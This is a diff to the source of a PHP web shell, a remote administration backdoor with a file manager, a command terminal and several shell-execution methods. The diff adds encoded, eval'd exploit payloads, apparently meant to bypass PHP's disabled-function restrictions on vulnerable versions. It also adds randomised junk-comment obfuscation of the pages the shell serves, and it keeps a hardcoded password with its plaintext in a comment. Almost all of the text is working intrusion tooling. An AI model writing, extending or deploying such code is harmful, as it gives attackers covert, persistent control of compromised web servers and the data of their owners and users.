@@ -2,10 +2,11 @@
 $GLOBALS['HASHTYPE'] = 'sha512';
 $GLOBALS['PASSHASH'] = 'dfbbeccfdcae9732e3d43697861efbe7bc56ffc746f07c3176a4594fc09977b747997d93cb65fb64ff093bc467e0ab35de3bc761efa29cb29a95c4df38375c26';//P@55w()rD
 $GLOBALS['SECHEAD'] = 'USER_AGENT';
+$GLOBALS['DEFAULT_TAB'] = 'tabInf';
 $GLOBALS['COOKIE'] = true;
 $GLOBALS['DARK'] = false;
 $GLOBALS['REMOTE_ADDR'] = true;
-$GLOBALS['ACECONF'] = array('URL' => 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.14.0/ace.js', 'MODE' => 'php', 'THEME' => 'dreamweaver');
+$GLOBALS['ACECONF'] = array('DEFAULT' => false, 'URL' => 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.14.0/ace.js', 'MODE' => 'php', 'THEME' => 'crimson_editor');
 $GLOBALS['DEBUG'] = (isset($GLOBALS['DEBUG']) ? $GLOBALS['DEBUG'] : false);
 
 filterClient();
@@ -152,16 +153,6 @@ function getData($str){
 	$pref = substr($str, 0, $ln);
 	$data = substr($str, $ln);
 	return ($pref === substr($GLOBALS['ENCKEY'], 0, $ln) ? $data : false);
-}
-
-function genJunk($min = 10, $max = 100){
-	$rand = '';
-	$repeat = rand($min, $max);
-	while(!isset($rand[$repeat])) $rand .= chr(rand(1, 127));
-	if(rand(1,2) == 1)
-		return '//'.str_replace(array("\r","\n"), "", $rand)."\n";
-	else
-		return '/*'.str_replace('*/','', $rand).'*/';
 }
 
 function paramsHandlerJS(){
@@ -396,12 +387,35 @@ function paramsHandlerJS(){
 </script>';
 }
 
-function j(){
-	return genJunk(100, 300);
+function makeOut($str){
+	print(c('<script>').t(f('write', 1).'('.f('decodeURIComponent').'('.f('atob').'(('.i(base64_encode(rawurlencode(c($str, 1))), 100, 400).'))));', true).c('</script>'));
 }
 
-function makeOut($str){
-	print('<script>'.t('document.write(decodeURIComponent(atob(('.implode('+', array_map(function($k){return '"'.$k.'"';}, str_split(strrev(base64_encode(rawurlencode($str))), rand(200, 500)))).').split("").reverse().join(""))));', true).'</script>');
+function f($f, $d = false){
+	$r = rand(0,1);
+	return ($r ? (rand(0,1) && !$d ? f('self') : ($r  && !$d ? f('top') : f('document'))).'['.i($f, 1, 3).']' : ($d ? f('document').'.'.$f : $f));
+}
+
+function i($s, $m, $x){
+	$s = str_split($s, rand($m, $x));
+	if($m > 50) $s[0] = trim(i($s[0], 1, 5, true), '"\'');
+	return implode('+', array_map(function($k){$r = date('H') > 12; return ($r ? '"' : '\'').$k.($r ? '"' : '\'');}, $s));
+}
+
+function c($s = '', $n = 0){
+	$r = array('/', '>', '*');
+	return (rand($n, 1) ? '<!--'.str_replace($r, '', j(1)).'-->'.(strlen($s) ? $s.(rand(0, 1) ? '<!--'.str_replace($r, '', j(1)).'-->'."\n" : '') : '') : $s);
+}
+
+function j($a = 0){
+
+	$l = rand(10, 100);
+	while(!isset($c[$l])) @$c .= chr($a ? rand(32, 126) : rand(1, 127));
+	
+	if(rand(0, 1))
+		return "//".str_replace(array("\r","\n"), "", $c)."\n";
+	else
+		return "/*".preg_replace("|\*/|","", $c)."*/";
 }
 
 function t($s, $n = false){
@@ -425,6 +439,39 @@ function sDie($str = ''){
 	else
 		print setValue($out.$str);
 	die;
+}
+
+function safemode($cmd = 'check'){
+	
+	if(!defined('PHP_VERSION_ID')) return false;
+	$c = __FUNCTION__;
+	$v = PHP_VERSION_ID;
+	
+	$pocs['cm_php_fpm'] = array('v' => ((strpos(php_sapi_name(), 'fpm') !== false) && is_int(array_search(true, array_map(function($f){if(function_exists($f)) return true;}, array('mail', 'error_log', 'imap_mail','mb_send_mail'))))), 'r' => 'execFPM($'.$c.')', 'c' =>'eJyNV21T20YQ/kxn+h8ORZmTMopkAyaEhFAGTPBMwK5x0ukkmRtZOmEVWdJIMoG2/Pfu7t35BZu2Mj7f7T63t7valyOZ5VGTFjmT9zI6H1w6djSN3b9+/mnLrmTNjlgSZrV8B2v4SxPHTsopUG9kg2CXkFt2PR2EzQToaZ4K4Dm8lnk8DdNMlMDgLgrYUtDJeZpJgDppLX5UaROOM+lwn7vsmAlx1hsKwQ5Z/VCjINHIaSnitIKjfB5wfxp3nCadSliTTHt6e56FNyAPOVq6T0YQP4GlKGeNiIq8kXlTG4zH+IvtYJzmQT3hvvUtt3z+gnFfC1QUlONz9gHpapuSGk2mRbyQ1HrT6SyZWE5KbaPRh/tA488ppPGg0ftjmLPjD8phJCwqYpTEcbElq6qoRCXLomrS/MZpqVO30O01uN1SgKy4sUCrp0wgCwLUhqv4iZPoKBDyPq1BJaueyCwTGBOW6xLKxMOC41hzr/jc0ocZidtpjWfiJh0kYHpRyTCaOGFVhQ+OheEBiqzobKXTsBSKY03HAsNILV0W1sxGRbU+m/RWfHMe6Ixrp+3BR+sHzxi0uDWrR/p95NoZeB5lAYS5x8azNIsHYXSrop3ehccW78vEhPuOwbO83+THmgzO4TVz3Eop4y6Fjc43jA+M/KcBa97XLM/S/NZZiUdD05oR8VFFUCWbWZUzZ7tuqrKo6Y3A8SrKMefo3EOV57jxEY8xjv3fLmDgc3SCXRIWDGmKGneg861v960WfNv6d+1L0bO83adS0qRhlv4pB2EVTrUwBcNHRdFijQ8fdn/93L0eicvu6KJ/xtkRpO7H7oh7T3DX3eGX7lAMhv1R/7T/SQEvRqNB0Pbba+iPJ6Pubye/i97VqDs8PzntKvzpx95GuBZ+dXKpgVkRhdmkqJs1KB4pLvrXo/8CDruX/VFXnJydDRW0vfPGb8Fnw/Gnw95gJM57n7pzFeYv7Al2cDEAmZe9K/Hl5NNnhf2jSHMHy5+30ce0L8yy4oeYVZlI8yibxfKI+yo4IKJ4P+cQUbyfJNz1NuyO0xqrvjBRVh8hdBOyKGUuxmEtoQU8CwpnTSFKqIpYLDB/VpSJwyY89LgPysociY4us/IuzByUvb8nYkkcqGiaoKEkxcXyBjmOdRntIqOweKx2ueVTTZsDdDCrq6CmRqPR7HXDXqfcXTXFXVrr6YasmGfV3r8xO6pYIFvnv0at5bcpVNTx7yBtMSIgeq97/SusIjZahnVJhQIP7sIqqGZ5AB4MsJaReRS36yxDeAanupx9J6vFAfbd19Z3KCv448PYpnFnEwnH3e9YToNXMHa4xzv+Lo17NCrKPoxv8Ou3aGzTuEPjLo2IPiDuAXEPiHtA3APgvgqUokXZLBRVJOhdeYGNHiZQYLFRc926TbfTHsTuhTOXzRlkONJh4jIS//U7CkOcz/HK4CPP56+hHfl1Ed3yuSKEXFSBw7etVmvtaNIYT4AJtc3FDe4XUFeGU4FSsdtkKTQbh7aAn9k2CA845k8TlYdBQAk9y9N7nLs+wjymzPeM9R5r68uCCTo4SnUtTTCXydUYXG26OlL1zXIiw1jFhz0u4oe5g6llJnCPqp9sI+aPCSSfs53IQtlrrgQ2tEm8TSUQ9mbjXuvtvrkpAVohjpj1rYIS6LKl28JcGUg1whH5UbXl9SO1xv5zxyVRVtRSgbVJJv+N/1DAmrs2NUY7jckFuF6EKJCw+pHTyANLMUlIDI1b+UAdAqrhTGqv0y5QHH3qWKdXlgevF8qng2jXc9rv3++2XfY3M2S1WV/JzW4EP6EQTt9OFmGh6xYZsaeVXr+KLKPs5qGUC/MsSxWw+eWjLqs0bxIHbx7tl9HiQ7cNKt9KBM3SmAVsp7MPAmH6kqZ0m9PWkT4Gskp8DvySHQDR1Ogl3dALCHm3SoPdeK+XYUM6g47OmkBX/1ewuaz/A3c4q58=');
+
+	$pocs['mm0r1_filter'] = array('v' => ($v >= 70000 && $v <= 70234 || $v >= 70300 && $v <= 70333 || $v >= 70400 && $v <= 70425 || $v > 80000 && $v < 80013), 'r' => 'pwn($'.$c.')', 'c' =>  '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');
+	
+	$pocs['mm0r1_concat'] = array('v' => ($v == 80013 && $v == 80014 || $v > 80100 && $v < 80120), 'r' => 'new Pwn($'.$c.')', 'c' =>'eNqtV1tvo0YUfs+vmFrIgpqswE5tJw6pvE20SS/ZNJc+rGuhMQxrEgzWABtnt/7vPTNcPAwQZ6taijwx53zn/s3BCXAco0sSrAlF39A6XQS+gxSsI2UBf84EbQ8cLnPzHKJvBwg+ThTGCfrl8uH6N/t8ej+1764+XSALGZuhMalJ5A8/XVyf2+cX7x8+2O8frn4/Rz+jmATeyYmM0wOcvoFOmh+L+Hf3t1fXHwoDzWiHgGaO4cucHAiql/c7p01zPJEeNQAXGjXAPGVeGjqJH4XItjkOTZ1EVZyVq+VZYx8voqriM6sTBN+nyOSHXk8UYh/lM42i1WxemsdBEDlqdhbc0yZvV6sGJmhuy1N5UCAGByc2xGFj16UlIPzQXycQRbL048OzJcFrOyD4SdV0ZA4FUMXzg+AN7u8UMkS8cL4jaAXECwdrPvcqPZF1j2zOo4SoJYqIXATIJ8NCIXnOx2Qn43sqGAtIqO6c16Cq0CGDwUiuKSVJSkMx7c3GAAbsdQJCks6kTWQBIkXLqcoGbG1bZR3e5h4hrocdIuYgk7CXOHQDQmOWxEyVksCmBLuqUSmRE0RxSkmZcVkYBrdR3iGiNEhWkdjIm4aQ/B3CAse+Y7NIBe8+k8QWHqiCnYr5r75nxy9xQlZV3ew3VQSv6Hn4CbByzMjzeP5GxqR9jlnFx/zcs9C4Ns27PD1TP4GGq1noga7+aooUX2uc2TeBG5vBGAZUR0dii+d1ZzIxSSCcm8sb+4/prx9v7b8ubu+uPl4jy4J4gKtZ/MDJQPHjyfeZlqzoYlnas150WDnfPdQcFyPvdodYR+oN0EIWVHmytIy23wDbgpiGEGcdNhPIp35N/S84IbtrQ2BSoXsUTFkaZrO5jmbz+c4GWLAJpVE5vGrJBhpKY4LULtPVUVdZpF6tITNYU7o9QJJxL/AnJWuCE7Xz98YwOjrad4FUGJnSmTlH7/aQONygOXd2ppTil47Y3RlVcodez1pO3yz/YtbW+CWIsAvBrLHzpHb+/BGCMDYuzNWCEI+dHeyRBV4QKKPM/IX2u2oupi2J2EVSaGqNVPb/lJJ9FWb+Y1ULfSCE/UXsbDqvl6BkfyUbcNGrvI6NqwNMNuQ+19lvIieYkkS+4CBlxQuRRLjAzahKzkrYsmSVjsxyXE6zbHtyluAnN4G67O705EUre3Z2BsZlUm6PgiWJNVuT2w0cYxp5c2ZLp3hB5vYtVN0/ygVCqywpYO0HK7NXaHYtpJro9BSxh/A10DS+0woXSzGEXOH1ArVdqhUmyxldeL5z0o3k2ng2CRP6Iu8N0qzmoiFe1TaMHEBHQ0meJaRQsfhbizv8aXQ0GoyORwO5R8REyH5At4wl7K00kFzK4m80Qpug56UfkNJFXhxD25/iys4jk16GCe8dpM4LvIf4u45Rz4UcFlsS8sxMx6jbreXDD23MKFttysgRU9drOuwz6xvm2BgNYA2B07FxbPTZqW8YxwODn0z221xrKoKyitw0ILxutf1TsJ/voK+py5oycoM6y1MFIWuco1F/aA6PhmRosgZq8ntPA4G74wZ725auqjBMnOBEfPPMblol9r+SJhKGCyBepp4HXSJfa5lOtQNl9JK+4QAaa0awjUTGIiNxzAm4ujE/ssyHGc/AP2cZRT8eHjZ2LMM4Pa0QbOXZPxaKqMv9mYE7QN2P88YNuUh/rlhEuT34F11ikeU=');
+	
+	foreach($pocs as $pocname => $poc)
+	{
+		if(!$poc['v']) continue;
+		
+		switch($cmd){
+			case 'check':
+				return $pocname;
+			break;
+			default:
+				ob_start();
+				eval('$'.$c.' = \'(echo "via '.$pocname.':";'.addslashes($cmd).') 2>&1\';echo '.$poc['r'].';'.gzuncompress(base64_decode($poc['c'])));
+				$res = ob_get_contents();
+				ob_end_clean();
+				
+				if(strpos($res, $pocname)) return $res;
+		}
+	}
+	
+	return (isset($res) ? $c.' for '.$v.' fails ;( ' : false);
 }
 
 #
@@ -739,24 +786,13 @@ function exe($cmd, $fnc, $sh = '', $se = TRUE, $or = '') {
 				fclose($p[1]);
 				proc_close($h);
 			}
+			break;
 		case 7:
-			if ($h = fopen('expect://' . $sc, 'r')) {
-				while (!feof($h))
-					echo fread($h, 1024);
-				fclose($h);
-			}
-			break;
-		case 8:
-			if ($h = expect_popen($sc)) {
-				while (!feof($h))
-					echo fread($h, 1024);
-				fclose($h);
-			}
-			break;
-		case 10:
 			if ($h = new COM('WScript.Shell'))
 				echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
 			break;
+		case 101:
+			echo safemode($cmd);
 	}
 }
 
@@ -2008,7 +2044,27 @@ switch ($D['a']) {
             }
         }
         function outFile($p) {
-						
+
+            if (preg_match('/\.gz$/i', $p)) {
+                if (is_int(readgzfile($p)))
+                    return TRUE;
+                
+                if ($v = gzopen($p)) {
+                    if (!is_int(gzpassthru($v)))
+                        while (!gzeof($v))
+                            echo gzread($v, 1048576);
+                    gzclose($v);
+                    return TRUE;
+                }
+                
+                if ($v = gzfile($p)) {
+                     if (is_array($v)) {
+                         foreach ($v as $i)
+                            echo $i;
+                        return TRUE;
+                     }
+                }
+            }						
             if (RO && is_int(readfile($p))){
                 return TRUE;
 			}
@@ -2024,17 +2080,7 @@ switch ($D['a']) {
                 fclose($v);
                 return TRUE;
             }
-            if (defined('FORCE_GZIP')) {
-                if (RO && is_int(readgzfile($p)))
-                    return TRUE;
-                if ($v = gzopen($p)) {
-                    if (!is_int(gzpassthru($v)))
-                        while (!gzeof($v))
-                            echo gzread($v, 1048576);
-                    gzclose($v);
-                    return TRUE;
-                }
-            }
+
             if (PHP_VERSION >= '5'):
                 if (PHP_VERSION >= '5.1') {
                     try {
@@ -2065,14 +2111,7 @@ switch ($D['a']) {
                     echo $i;
                 return TRUE;
             }
-            if (defined('FORCE_GZIP')) {
-                $v = gzfile($p);
-                if (is_array($v)) {
-                    foreach ($v as $i)
-                        echo $i;
-                    return TRUE;
-                }
-            }
+
             return FALSE;
         }
         if (isset($D['s'])) {
@@ -4843,7 +4882,7 @@ ob_start();
 });
 var mdlWndws = [],
  tmShft = <?php echo time()*1000;?> - Date.now(),
- exeFuncs = [],
+ exeFuncs = [], fmSort = [1, 1],
  spnDtTm;
 document.addEventListener('DOMContentLoaded', function() {
  if (sessionStorage.getItem('uiRszBody')) document.body.style.width = '100%';
@@ -5190,13 +5229,18 @@ function parseName(file) {
 }
 
 function cmprFiles(f1, f2) {
- var f1F = f1[1] !== null,
-  f2F = f2[1] !== null;
+ var [o, i] = fmSort;
+ var c1 = (i[1] ? f1[i[1]] : f1[0][i]);
+ var c2 = (i[1] ? f2[i[1]] : f2[0][i]);
+
+ var f1F = f1[1] !== null, f2F = f2[1] !== null;
+ 
  if (f1F && f2F) {
-  if (f1[0][2] !== f2[0][2]) return f1[0][2] > f2[0][2] ? 1 : -1;
- } else if (f1F) return 1;
- else if (f2F) return -1;
- return f1[0][1] > f2[0][1] ? 1 : -1;
+  if (c1 !== c2) return c1 > c2 ? 1*o : -1*o;
+ }
+ else if (f1F) return 1*o;
+ else if (f2F) return -1*o;
+ return f1[0][1] > f2[0][1] ? 1*o : -1*o;
 }
 
 function frmtSize(s) {
@@ -5433,8 +5477,9 @@ function isInsPos(file, cells) {
  var fF = file[1] !== null,
   rF = cells[3].firstChild.textContent !== '[ DIR ]';
  if (fF && rF) {
-  var fExt = file[0][2],
-   rExt = cells[2].firstChild.textContent;
+  var by = (fmSort[0] < 3 ? fmSort[0] : 1);
+  var fExt = file[0][by],
+   rExt = cells[by].firstChild.textContent;
   if (fExt !== rExt) return rExt > fExt;
  } else if (fF) return false;
  else if (rF) return true;
@@ -6599,9 +6644,9 @@ function onEvl(div, data) {
  if (chr === "\x15" && data.slice(0, -3) === '' && !elmById('frmPHP').h.checked) data = '\nFatal error: You have syntax error in PHP code\n';
  else data = data.slice(0, -3);
  if (elmById('cbHTML').checked) {
-  var divRst = document.createElement('div');
-  divRst.style = 'all:initial;isolation:isolate;';
-  divRst.innerHTML = data.replace(/<style(\s|>)/ig, '<style scoped$1');
+  var divRst = document.createElement('iframe');
+  divRst.style = 'all:initial;isolation:isolate;width:100%;height:100%;';
+  divRst.srcdoc = data;
   elm.appendChild(divRst);
  } else elm.appendChild(document.createTextNode(data));
  uiDelMsg(div);
@@ -6661,9 +6706,13 @@ function onTrmInpKeyDwn(e) {
 }
 
 function prntMsg(msg) {
- elmById('preTrm').textContent += elmById('spnUsrHst').textContent + ':' + elmById('spnPth').textContent + '$ ' + msg + '\n';
- var trm = elmById('divTrm');
- trm.scrollTop = trm.scrollHeight;
+ if(elmById('cbIT').checked)
+    elmById('preTrm').textContent = elmById('spnUsrHst').textContent + ':' + elmById('spnPth').textContent + '$ ' + msg + '\n' + elmById('preTrm').textContent;
+ else{
+    elmById('preTrm').textContent += elmById('spnUsrHst').textContent + ':' + elmById('spnPth').textContent + '$ ' + msg + '\n';
+    var trm = elmById('divTrm');
+    trm.scrollTop = trm.scrollHeight;
+ }
  return false;
 }
 
@@ -6854,11 +6903,16 @@ function ajxSnd(msg, clbck, frm, data, chrst) {
 	
 	 function onResp() {
 	  deleteAllCookies();
+
 	  msgDiv.firstChild.onclick = uiClsMsg;
-	  var doc = reqIfrm.contentDocument,
-	   data = RO ? doc.body.textContent : getValue(doc.body.textContent),
-	   cset = doc.characterSet;
+	  var doc = reqIfrm.contentDocument;
+	  var xr = reqIfrm.getAttribute('xr');
+	  var xc = reqIfrm.getAttribute('xc');
+	  var resp = xr ? xr : doc.body.textContent;
+	  var cset = xc ? xc : doc.characterSet;
+	  var data = RO ? resp : getValue(resp);
 	  document.body.removeChild(reqIfrm);
+	  
 	  if (data.slice(0, 2) === '\x01\x02') {
 	   if (data.slice(-3) === '\x17\x04\x10' && data.indexOf('\x03\x1E')) data = data.slice(2, -3);
 	   else data = false;
@@ -6953,10 +7007,12 @@ function ajxSnd(msg, clbck, frm, data, chrst) {
 			reqIfrm.src = reqFrm.action;
 
 		else if(!data.hasOwnProperty('d')){
-			xhr = new XMLHttpRequest();
+			var xhr = new XMLHttpRequest();
 			xhr.open(reqFrm.method, '', false);
 			xhr.send(new FormData(reqFrm));
-			reqIfrm.srcdoc = xhr.response;
+			reqIfrm.setAttribute('xr', xhr.responseText);
+			reqIfrm.setAttribute('xc', xhr.getResponseHeader('content-type').split('=')[1]);
+			reqIfrm.srcdoc = '';
 		}
 		else
 			(COOKIE || !OI && reqFrm.method == 'get' ? window.location.href = window.location.pathname : reqFrm.submit());
@@ -6972,9 +7028,10 @@ function ajxSnd(msg, clbck, frm, data, chrst) {
 }
 </script>
 
-<script id="dataExe"type="text/data"><?php $a=array('system','passthru','backticks','shell_exec','exec','popen');if(PHP_VERSION>='4.3')$a[]='proc_open';/*if(defined('EXP_EOF')){$a[7]='expect://';$a[8]='expect_popen';}if(!NIX&&defined('CLSCTX_ALL'))$a[10]='com';$s=NIX?';':'&';$c=NIX?'pwd':'cd';$w=NIX?'whoami':'echo %username%';foreach($a as$k=>$v)exe('echo '.$k.':'.$v.$s.$w.$s.'hostname'.$s.$c,$k,'',FALSE);*/foreach($a as $k => $v){if(function_exists($v)) print $k.':'.$v."\n".get_current_user()."\n".gethostname()."\n".__DIR__."\n";}?></script></head><body onkeydown="uiKeyDwn(event)"><div id="divHdr"class="divCntrls"><a href="#"class="cntrl"title="Color mode"onclick="return invertColors()">&#x23FA;</a><a href="#"class="cntrl"title="Resize view"onclick="return uiRszBody()">&#x21C4;</a><a href="#"class="cntrl"title="Settings"onclick="return uiShwModal('divStngs')">&#x2699;</a></div><div id="divBody"><span id="tabFM"><a href="#tabFM"class="tab">File Manager</a><div class="tabPage"id="divFM"><textarea id="txtClpbrd"tabindex="-1"></textarea><form hidden id="frmUpl"><input type="file"name="f[]"id="inpUpl" onchange="uplFiles()"/></form><form class="toolbar"id="frmFM"onsubmit="return goTo(this.p.value)"><a href="#"class="cntrl"id="btnSrch"title="Search..."onclick="return uiShwFrmSrch()"></a><button type="button"title="Go home!"onclick="goTo('~')">~</button> <?php if(!NIX){$a=range('A','Z');foreach($a as$v){$i=new FileInfo($v.':\\');if($i->isDir())echo'<button type="button"onclick="goTo(',"'",$v,":\\\\'",')">',$v,':</button>';}}?> <input type="text"name="p"value="<?php echo escHTML(selfPath());?>"/><button title="Go!">&gt;</button><span class="spnBtnSbMn"><button type="button"id="btnFastAct"title="Fast actions..."onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"><hr class="arwDwn"/></button><div class="divSbMn"onclick="onFastActClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Properties</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Delete</a></div></span>&nbsp; <span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="fmCSSend"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select id="fmCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></form><div class="subbar"><button type="button"title="You can upload multiple files at once..."onclick="elmById('inpUpl').click()">Upload &#8230;</button><span class="spnBtnSbMn"><button type="button"class="btnSbMn"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)">Create <hr class="arwDwn"/></button><div class="divSbMn"onclick="onCrtMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">File</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Link</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Directory</a></div></span><span class="spnBtnSbMn"><button type="button"class="btnSbMn"id="btnBufferMenu"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"disabled>Buffer <hr class="arwDwn"/></button><div class="divSbMn"onclick="onBufferMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Show files<a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Copy here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Move here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Clear</a></div></span></div><div><form id="frmFiles"><table id="tblFiles"cols="<?php echo NIX?8:7;?>"onclick="onTblFilesClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Files', this.checked)"/></th><th>Name</th><th width="65px">Ext</th><th width="105px">Size</th><th width="145px">Modified (UTC)</th><th width="95px">Permission</th> <?php if(NIX){?><th width="155px">Owner</th><?php }?> <th width="65px">Actions</th></tr></thead><tfoot><tr><th colspan="<?php echo NIX?8:7;?>"><button type="button"onclick="dwnFiles(getSlctdFiles())">Download</button><button type="button"onclick="prpsSlctdFiles()">Properties</button><button type="button"onclick="markSlctdFiles()">Mark</button><button type="button"onclick="delFiles(getSlctdFiles())">Delete</button></th></tr></tfoot></table></form></div><template id="tmplFilesTBody"><tbody><tr><th colspan="<?php echo NIX?8:7;?>"class="thPth"></th></tr><tr><td class="tdUp"><input type="hidden"/>&#x21b4;</td><td colspan="<?php echo NIX?7:6;?>"><a href="#"class="lnkBlck">[ .. ]</a></td></tr></tbody></template><template id="tmplFileRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkAct"></a></td><td></td><td><a href="#"class="lnkAct"></a></td><?php if(NIX){?><td></td><?php }?><td><a href="#"class="lnkAct">Mrk</a>&nbsp;<a href="#"class="lnkAct">Del</a></td></tr></template><div id="divWndws"><template id="tmplFrmFile"><form class="modal frmFile"onsubmit="saveFile(event)"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">New File</span><a href="#"class="cntrl"title="Close"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz(this.parentNode.parentNode)">&#x2922;</a><a href="#"class="cntrl"title="Reload file"onclick="rldFile(event)">&#x27F3;</a></div><textarea name="t"></textarea><div class="flexRow"><input type="text"required/><select name="c"title="File encoding..."onchange="rldFileAs(event)"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select><select name="e"><option value="0">\r\n</option><option value="1"<?php if(NIX)echo' selected';?>>\n</option><option value="2">\r</option></select><button>Save</button></div></form></template><form id="frmSrch"class="modal"onmousedown="uiActvModal(event)"onsubmit="srchFiles(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Search</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmSrch')">&#x00D7;</a></div><label class="option"title="exx: <?php echo NIX?'/var/www:/etc:/tmp/':'c:\\inetpub\\wwwroot;d:\\www\\';?>">Paths<input type="text"required /></label><div class="flexRow noFlex"><div class="option"> Name (<label title="? - single char; * - zero or more char; [!0123A-Z] - class of chars (- for range, ! to exclude)"><input type="checkbox"name="w"/>wildcard</label>, <label><input type="checkbox"name="i"/>case-insensitive</label>) <input type="text"name="n"/></div><label class="option"title="Max search depth">Depth<input type="text"name="d"size="1"size="1"/></label><label class="option">Type <select name="y"onchange="uiSrchFTypeChngd()"><option value="">Any</option><option value="1">Dirs</option><option value="0">Files</option></select></label><label class="option">Mode <select name="p"><option value="">Any</option><option value="1">Readable</option><option value="2">Writable</option><option value="3">Full access</option></select></label> <?php if(NIX){?> <label class="option"> Attribute <select name="u"><option value="">Any</option><option value="1">SUID</option></select></label></div><div class="flexRow"><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Owner id<input type="text"name="o"/></label><hr 